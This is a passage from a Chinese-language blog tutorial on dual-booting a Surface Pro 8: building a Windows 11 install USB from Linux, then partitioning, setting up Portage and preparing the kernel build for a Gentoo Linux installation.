fat32 文件系统所支持的最大文件大小（4G），虽然部分 OEM 的 UEFI 会额外有对 exFAT 或是 NTFS 的支持，但为了兼容性考虑我们还是选择 fat32，并使用第三方软件 RUFUS 所提供的 EFI 程序</p></blockquote><p>这里的 <code>/dev/sda</code> 为你的 U 盘设备路径，请自行辨别，需要注意的是<strong>NTFS 分区应当在第一位，EFI 分区在第二位</strong> ，否则会导致 <em>无法进行安装</em>  （提示缺少驱动）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo parted /dev/sda</span>                        <br>GNU Parted 3.6<br>Using /dev/sda<br>Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.<br>(parted) unit s                                                           <br>(parted) mktable gpt<br>Warning: The existing disk label on /dev/sda will be destroyed and all data on this disk will be lost. Do you<br>want to continue?<br>Yes/No? Yes                                                               <br>(parted) mkpart windows-iso ntfs 2048 16777215<br>(parted) mkpart efi fat32 16777216 33554432<br>(parted) set 2 esp on                                                     <br>(parted) set 2 boot on                                                    <br>(parted) name 1 Windows                                                   <br>(parted) name 2 EFI                                                       <br>(parted) quit<br>Information: You may need to update /etc/fstab.<br><br></code></pre></td></tr></table></figure><p>然后运行如下两条命令初始化 EFI 分区的文件系统：</p><blockquote><p>需要说明的是与 NTFS 相关的操作在 Linux 下都会特别慢（至少在笔者的机器上如此，这可能和 <code>ntfs-3g</code> 的性能相关），建议 <del>其实也只能</del> 耐心等待：）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.ntfs /dev/sda1</span><br>Cluster size has been automatically set to 4096 bytes.<br>Initializing device with zeroes: 100% - Done.<br>Creating NTFS volume structures.<br>mkntfs completed successfully. Have a nice day.<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.fat -F 32 /dev/sda2</span>               <br>mkfs.fat 4.2 (2021-01-31)<br></code></pre></td></tr></table></figure><p>接下来将 ISO 中数据拷贝到 U 盘当中，再将 <a href="https://github.com/pbatard/rufus/blob/master/res/uefi/uefi-ntfs.img">RUFUS</a> 提供的 EFI 镜像拷贝到 EFI 分区即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> /mnt/&#123;iso,efi,win&#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount ~/Downloads/Win11_23H2_Chinese_Simplified_x64v2.iso /mnt/iso/</span><br>mount: /mnt/iso: WARNING: source write-protected, mounted read-only.<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda1 /mnt/win/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda2 /mnt/efi/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> -r /mnt/iso/* /mnt/win/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/iso</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount ~/Downloads/uefi-ntfs.img /mnt/iso/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> -r /mnt/iso/* /mnt/efi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/efi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/win</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/iso</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sync</span></span><br></code></pre></td></tr></table></figure><p>之后就能 <del>原神启动</del> 正常启动进入安装界面了，需要注意的是<strong>原装的键盘触摸板完全无法使用，因此你需要额外用扩展坞连接通用无驱键鼠</strong>：</p><blockquote><p>原装键鼠仅在 UEFI 启动阶段可用，目测是 Windows 官网默认的安装介质中并未带有对应的驱动</p></blockquote><p><img src="https://s2.loli.net/2024/04/27/tRg15behirlnsIU.jpg" alt="Windows，启动——"></p><blockquote><p>以及这个安装方式在笔者的电脑上并未成功，但是使用各种第三方的 PE 启动盘提供的第三方工具却能轻松完成， <del>👴只能说 Windows 官方的安装程序确实比较垃圾</del></p></blockquote><h1 id="0x02-安装-Gentoo-Linux"><a href="#0x02-安装-Gentoo-Linux" class="headerlink" title="0x02. 安装 Gentoo Linux"></a>0x02. 安装 Gentoo Linux</h1><p>完成 Windows 安装之后接下来是安装 Gentoo Linux，在开始之前别忘了在 Windows 上进入硬盘管理中划出一块完整的空间留给 Gentoo Linux 使用，这里笔者就不截图了：）</p><h2 id="创建安装介质"><a href="#创建安装介质" class="headerlink" title="创建安装介质"></a>创建安装介质</h2><p>在 <a href="https://www.gentoo.org/downloads/">Gentoo 官网上下载镜像后</a> 用 balenaEtcher 或是一些其他的软件或是直接 <code>dd</code> 往 U 盘里写都 ok，其中 <code>Minimal Installation CD</code> 和 Arch 一样只有命令行，而 <code>LiveGUI USB Image</code> 则带有一个图形环境，<strong>但是最后都是要敲命令行一步步安装</strong> ，只是带 GUI 的会有个 KDE 桌面让你能在 Konsole 中敲，方便开浏览器和联网 ：）</p><blockquote><p>以及别忘了在 Surface UEFI 中将 USB 调整为第一启动项</p></blockquote><p>进入桌面后只有一个 <a href="https://wiki.gentoo.org/wiki/Handbook:Main_Page">Gentoo Linux Handbook</a> 的快捷方式，而不似其他 Linux 发行版有引导式安装程序：</p><p><img src="https://s2.loli.net/2024/04/30/xaksIHeSrmup2VT.jpg" alt="需要注意的是 Surface 屏幕分辨率较高，建议调一下缩放后 logout 再重新进来"></p><h2 id="创建文件系统"><a href="#创建文件系统" class="headerlink" title="创建文件系统"></a>创建文件系统</h2><blockquote><p>网络连接笔者直接使用 KDE 组件完成了，习惯命令行的也可以尝试使用 <code>net-setup</code> </p></blockquote><p>首先我们先使用 <code>cfdisk</code> 对硬盘进行分区，按惯例建立四个新分区：</p><ul><li>EFI 分区（<code>fat32</code>，挂载在 <code>/boot/efi</code> ）：存放 EFI 启动程序（grub）</li><li>系统分区（ <code>ext4</code> ，挂载在 <code>/</code> ）：存放系统基本文件</li><li>数据分区（ <code>ext4</code> ，挂载在 <code>/home</code> ）：存放用户数据</li><li>SWAP 分区（<code>swap</code> ）：交换内存</li></ul><p>Surface 上仅有一块 SSD ，所以硬盘路径基本上定死为 <code>/dev/nvme0n1</code> ，如果你在其他有多块硬盘的机器上参照本文进行配置则注意识别自己想要安装的键盘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">cfdisk /dev/nvme0n1</span><br></code></pre></td></tr></table></figure><blockquote><p>注：这一步使用 LiveGUI CD 中的 KDE Partitioner 或是 GParted 也可以</p></blockquote><p><img src="https://s2.loli.net/2024/04/30/y6X4YeOlGKPbNkC.jpg" alt="100M 是 Windows 分区弄错了留下来的一个多余的无用空间，因为 NTFS 没法前扩所以笔者也懒得管了"></p><p>接下来创建文件系统，惯例地 <code>mkfs</code> 一把梭，开始之前最好先 <code>fdisk -l</code> 再辨别一下自己想要格式化的分区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.fat -F 32 /dev/nvme0n1p4</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p5</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkswap /dev/nvme0n1p6</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">swapon /dev/nvme0n1p6</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p7</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/30/FCveHV8alMDSgPW.jpg" alt="日志输出太长了，没法拍完屏，将就看看"></p><p>最后就是挂载文件系统了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p5 /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/boot</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/boot/efi</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/home</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p4 /mnt/gentoo/boot/efi</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p7 /mnt/gentoo/home</span><br></code></pre></td></tr></table></figure><h2 id="安装-Stage-3"><a href="#安装-Stage-3" class="headerlink" title="安装 Stage 3"></a>安装 Stage 3</h2><p><code>Stage</code> 可以简单理解为构建 Gentoo Linux 系统的各个不同阶段：</p><ul><li><code>Stage 1</code> ：通常仅 Gentoo 内部开发人员使用，由一个基本的 <code>packages,build</code> 文件生成的系统包</li><li><code>Stage 2</code> ：通常仅 Gentoo 内部开发人员使用，从 Stage 1 编译而来的可以自举的工具链</li><li><code>Stage 3</code> ：由 Stage 2 编译而来的文件，并包含一组  <a href="https://wiki.gentoo.org/wiki/System_set_(Portage)">@system set</a> 软件包</li><li><code>Stage 4</code> ：在 Stage 3 基础上安装好的完整的 Gentoo 系统</li></ul><p>首先我们将 <a href="https://www.gentoo.org/downloads/">Stage 3</a> 下载到文件系统根目录下解压，笔者比较习惯 systemd 所以还是选择 systemd + desktop 版的：</p><blockquote><p>systemd 某种程度上也成为了 Linux 的事实标准了，不得不感叹红帽的大手…但笔者相比起 OpenRC 而言确实比较习惯 systemd，所以也没什么好纠结的…</p><p><img src="https://syste.md/"></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">wget https://distfiles.gentoo.org/releases/amd64/autobuilds/20240428T163427Z/stage3-amd64-desktop-systemd-20240428T163427Z.tar.xz</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">tar xpvf stage3-*.tar.xz --xattrs-include=<span class="hljs-string">&#x27;*.*&#x27;</span> --numeric-owner</span><br></code></pre></td></tr></table></figure><p>然后是配置机器时间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">chronyd -q</span><br></code></pre></td></tr></table></figure><p>接下来配置编译选项，Portage 在运行时会读取一个 <code>make.conf</code> 配置文件，位于文件系统根目录下的 <code>/etc/portage/make.conf</code> 当中，Stage 3 文件中已经给我们提供好了一个空白模板，其中主要是一些编译参数与选项，我们只需要根据自身习惯进行修改即可：</p><blockquote><p>一般来说只需要在 <code>COMMON_FLAGS</code> 中添加 <code>-march=native</code> 以告诉编译器选择当前的系统体系结构，此时 GCC 会自动调查 CPU 并配置合适的 flag，但若是当前机器正在为其他机器编译时则不应当启用该项</p><p>对于内存比较小的设备，则不应当启用 <code>-pipe</code> 编译选项，因为这使用管道而非文件来存放编译中间文件，而这将占用更多的内存，从而导致编译器可能被 kill 掉而编译失败</p><p>其他的可用选项可以参照 <a href="https://wiki.gentoo.org/wiki//etc/portage/make.conf">Gentoo wiki</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">vim ./etc/portage/make.conf</span><br></code></pre></td></tr></table></figure><h2 id="安装基本系统"><a href="#安装基本系统" class="headerlink" title="安装基本系统"></a>安装基本系统</h2><p>接下来复制 DNS 信息，从而确保 chroot 之后有网可用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> --dereference /etc/resolv.conf /mnt/gentoo/etc/</span><br></code></pre></td></tr></table></figure><p>接下来挂载一些必要的文件系统并 chroot 到根目录，也可以直接通过 <code>arch-chroot /mnt/gentoo</code> 命令完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --types proc /proc /mnt/gentoo/proc</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --rbind /sys /mnt/gentoo/sys</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-rslave /mnt/gentoo/sys</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --rbind /dev /mnt/gentoo/dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-rslave /mnt/gentoo/dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --<span class="hljs-built_in">bind</span> /run /mnt/gentoo/run</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-slave /mnt/gentoo/run</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">chroot</span> /mnt/gentoo /bin/bash</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">source</span> /etc/profile</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot) <span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>接下来配置 Portage 仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> --parents /etc/portage/repos.conf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/share/portage/config/repos.conf /etc/portage/repos.conf/gentoo.conf</span><br></code></pre></td></tr></table></figure><p>接下来安装 Gentoo ebuild 数据库快照：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge-webrsync</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选配置：选择镜像站）</p><p>若有需要，则可以使用 <code>mirrorselect</code> 这个工具来手动选择想要使用的镜像源（空格键选中后 enter，可以选多个项），本质上是往 <code>make.conf</code> 中写入新的 <code>GENTOO_MIRRORS</code> 变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --verbose --oneshot app-portage/mirrorselect</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mirrorselect -i -o &gt;&gt; /etc/portage/make.conf</span><br></code></pre></td></tr></table></figure></blockquote><p>接下来配置系统的 <code>profile</code> （决定了系统的默认配置，例如 <code>USE</code> 和 <code>CFLAGS</code> 等），第一条命令用来查看可用配置，第二条则进行选择，这里笔者选择了 <code>default/linux/amd64/23.0/desktop/plasma/systemd</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect profile list</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect profile <span class="hljs-built_in">set</span> 28</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选配置：添加二进制包源）</p><p>众所周知 gentoo 是个几乎任何东西都要自行编译的发行版，如果你不想在当前机器上进行编译，而想要像其他发行版那样直接拿二进制可执行文件，则可以配置一个 <code>binary package host</code> ，这可以是你的另一台 Gentoo 机器，也可以是官方或是其他人的源</p><p>源地址需要写在 <code>/etc/portage/binrepos.conf/gentoobinhost.conf</code> 文件中，这是官方给的一个例子：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[binhost]</span><br><span class="hljs-attr">priority</span> = <span class="hljs-number">9999</span><br><span class="hljs-attr">sync-uri</span> = https://distfiles.gentoo.org/releases/&lt;arch&gt;/binpackages/&lt;profile&gt;/x86-<span class="hljs-number">64</span>/<br></code></pre></td></tr></table></figure><p>对于想要以获取二进制可执行文件的形式进行安装的软件包，在使用 <code>emerge</code> 安装软件时添加 <code>--getbinpkg</code> 即可，也可以通过修改 <code>/etc/portage/make.conf</code> 文件并添加 <code>FEATURES</code> 变量来完成，例如：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># Appending getbinpkg to the list of values within the FEATURES variable</span><br><span class="hljs-attr">FEATURES</span>=<span class="hljs-string">&quot;$&#123;FEATURES&#125; getbinpkg&quot;</span><br><span class="hljs-comment"># Require signatures</span><br><span class="hljs-attr">FEATURES</span>=<span class="hljs-string">&quot;$&#123;FEATURES&#125; binpkg-request-signature&quot;</span><br></code></pre></td></tr></table></figure><p>若选择这种方式，则在修改后需要额外运行 <code>getuto</code> 命令进行配置</p></blockquote><p>接下来配置 <code>CPU_FLAGS_*</code> 变量，编译器会在编译特定汇编代码&#x2F;指令时使用，笔者是 <code>x86/64</code> 架构所以应当为 <code>CPU_FLAGS_X86</code> ，不过工具 <code>cpuid2cpuflags</code> 可以帮我们完成输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --oneshot app-portage/cpuid2cpuflags</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/* <span class="hljs-subst">$(cpuid2cpuflags)</span>&quot;</span> &gt; /etc/portage/package.use/00cpu-flags</span><br></code></pre></td></tr></table></figure><p>接下来在 <code>/etc/portage/make.conf</code> 中添加 <code>VIDEO_CARDS</code> 变量，用以恰当地配置 GPU，Surface Pro 8 只有一个 Intel 核显所以该变量应为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">VIDEO_CARDS</span>=<span class="hljs-string">&quot;intel&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选配置：可接受的 License）</p><p>如果你对软件包有 License 洁癖，不是 GPL&#x2F;MIT&#x2F;.. 的不用，则可以配置 <code>ACCEPT_LICENSE</code> 变量，建议参照官方的 handbook</p><p>如果想全都接收，则在 <code>/etc/portage/make.conf</code> 中将该变量设为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ACCEPT_LICENSE</span>=<span class="hljs-string">&quot;*&quot;</span><br></code></pre></td></tr></table></figure></blockquote><p>接下来配置时区，笔者用的是 systemd ，所以直接将时区文件软链接到 <code>/etc/localtime</code> 即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br></code></pre></td></tr></table></figure><p>然后是进行本地化配置，在 <code>/etc/locale.gen</code> 中添加对应项即可，例如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">en_US</span> ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><br><span class="hljs-attribute">en_US</span>.UTF-<span class="hljs-number">8</span> UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">zh_CN</span> GBK <br><span class="hljs-attribute">zh_CN</span>.UTF-<span class="hljs-number">8</span> UTF-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>接下来运行 <code>locale-gen</code> 命令，其会根据  <code>/etc/locale.gen</code> 中项进行生成，生成结束后通过 <code>eselect</code> 命令进行选择，这里最好先选择 <code>C.utf8</code> ，完成之后更新环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">locale-gen</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect locale list</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect locale <span class="hljs-built_in">set</span> 2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">env-update &amp;&amp; <span class="hljs-built_in">source</span> /etc/profile &amp;&amp; <span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot) <span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>对于中文用户，你可能会需要 gentoo 中文社区的仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-eselect/eselect-repository</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect repository <span class="hljs-built_in">enable</span> gentoo-zh</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emaint <span class="hljs-built_in">sync</span> -r gentoo-zh</span><br></code></pre></td></tr></table></figure><h2 id="编译与安装内核"><a href="#编译与安装内核" class="headerlink" title="编译与安装内核"></a>编译与安装内核</h2><blockquote><p>（可选配置：安装固件与微码）</p><p>在开始配置内核前我们可以安装可选的微码与固件，Surface Pro 8 是 Intel CPU，所以微码应当安装 <code>sys-firmware/intel-microcode</code> 包，固件则都为通用的 <code>sys-kernel/linux-firmware</code> 包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-firmware/intel-microcode</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/linux-firmware</span><br></code></pre></td></tr></table></figure><p>可能会遇到 <code>all ebuilds that could satisfy * have been masked</code> 的错误，这是因为 LICENSE 配置问题，通过如下命令进行补充即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;sys-kernel/linux-firmware @BINARY-REDISTRIBUTABLE&quot;</span> | <span class="hljs-built_in">tee</span> -a /etc/portage/package.license</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;sys-firmware/intel-microcode @BINARY-REDISTRIBUTABLE&quot;</span> | <span class="hljs-built_in">tee</span> -a /etc/portage/package.license</span><br></code></pre></td></tr></table></figure></blockquote><p>虽然内核主线暂且缺少一些 Surface 驱动，但是有一个社区项目 <a href="https://github.com/linux-surface/linux-surface">linux-surface</a> 提供了部分驱动，可惜的是该项目本身仅提供 Arch&#x2F;Debian&#x2F;Fedora 的版本，而在 Wiki 中 fork 到 Gentoo 这边<a href="https://github.com/Parinz/Surface-Gentoo">对应仓库</a>的维护者不知道什么时候已经跑路了，因此笔者只能先用默认的内核，这里我们有三种大方向上的选择：</p><ul><li>安装 <a href="https://wiki.gentoo.org/wiki/Project:Distribution_Kernel">Distribution kernels</a>：Gentoo 官方维护的 kernel，涵盖了内核编译安装的完整过程且已经配置好了一份支持主要硬件的配置文件，<a href="https://wiki.gentoo.org/wiki/Project:Distribution_Kernel#Modifying_kernel_configuration">配置文件也可以手工更改</a>，安装方法与装普通软件包无异</li><li>使用 <a href="https://wiki.gentoo.org/wiki/Genkernel">Genkernel</a> 进行配置：<code>genkernel</code> 是 Gentoo 官方提供的用来自动构建内核与 initramfs 的软件，简化了使用者手工安装内核的过程</li><li>纯手工编译安装内核：通过 <code>eselect kernel</code> 拉取内核源码后手工 <code>make</code> 进行配置、编译、安装，_<a href="https://github.com/arttnba3/XDU-SCE_OS-Experiment_2021/tree/main/Exp-7">就像你的操作系统老师让你在操作系统实验课上做的那样</a>_ ， <del>没让你自己从 kernel.org 拉就偷着乐吧</del></li></ul><p>作为 Linux kernel hacker，手工编译内核自然是第一选择，主要原因是方便更改编译选项 <del>而且这样看起来会显得👴比较帅</del> </p><blockquote><p>不选 distribution 的原因是配置文件中可能未必默认包含笔者需要的硬件驱动，再逐条改起来有点麻烦，而 Genkernel 感觉有点上不去下不来卡在那里了</p></blockquote><p>首先安装必要的工具：</p><blockquote><p>其中 <a href="https://wiki.gentoo.org/wiki/Installkernel">installkernel</a> 是可选包，用于自动安装新的内核并更新 bootloader 配置， <del>如果你比较闲的话也可以手工完成</del></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-apps/pciutils</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/installkernel</span><br></code></pre></td></tr></table></figure><p>拉取 Gentoo 官方维护的内核源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/gentoo-sources</span><br></code></pre></td></tr></table></figure><blockquote><p>如果你选择用 gentoo 官方的内核配置（<code>gentoo-kernel</code>），可能出现提示需要检查 configure 的问题，使用如下命令修复：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">dispatch-conf</span><br></code></pre></td></tr></table></figure><p>基本上一路 <code>u</code> （update） 即可</p></blockquote><p>使用如下命令查看当前安装的源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect kernel list</span><br></code></pre></td></tr></table></figure><p>通常我们会在 Linux 系统中维护一个指向当前内核源码的符号链接 <code>/usr/src/linux</code>，在 Gentoo 下我们通过如下命令手动创建（序号由 <code>eselect</code> 命令获得）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect kernel <span class="hljs-built_in">set</span> 1</span><br></code></pre></td></tr></table></figure><p>接下来创建配置文件 <code>.config</code> ，这里笔者使用默认的 <code>make defconfig</code> ，你也可以使用 <code>make localmodconfig</code> 来检测硬件并决定开启的内核模块，根据自己的需求进行选择即可：</p><blockquote><p>内核模块会独立存在，如果你想让内核模块被编译到 vmlinuz 中，使用 <code>localyesconfig</code> ，如果你想要开启尽可能多的编译选项，可以选择 <code>allyesconfig</code> 或 <code>allmodconfig</code> ， <em>但是经笔者实测似乎开启的编译选项数量没有默认的多…</em></p><blockquote><p> 此外，集成到内核中的内核模块可能会有点小问题（例如笔者曾经碰到过 Intel 